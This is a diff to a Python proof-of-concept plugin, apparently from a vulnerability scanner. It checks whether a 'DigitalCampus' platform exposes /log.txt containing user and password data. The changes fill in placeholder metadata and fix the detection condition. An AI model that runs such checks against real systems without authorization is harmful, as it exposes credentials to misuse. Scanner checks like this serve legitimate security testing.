@@ -13,11 +13,11 @@ class Vuln(ABVuln):
     desc = '''
         通用型数字校园平台 /log.txt 敏感信息泄露漏洞。
     ''' # 漏洞描述
-    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=071575
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
+    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=071575
+    cnvd_id = 'Unkonwn' # cnvd漏洞编号
+    cve_id = 'Unkonwn' #cve编号
     product = 'DigitalCampus'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
@@ -35,14 +35,14 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             url=arg+"/log.txt"
             code,head,res,errcode,_=hh.http(url)
-            if code==200 and 'User' and 'Password' in res:
+            if code==200 and 'User' in res and 'Password' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 
 if __name__ == '__main__':
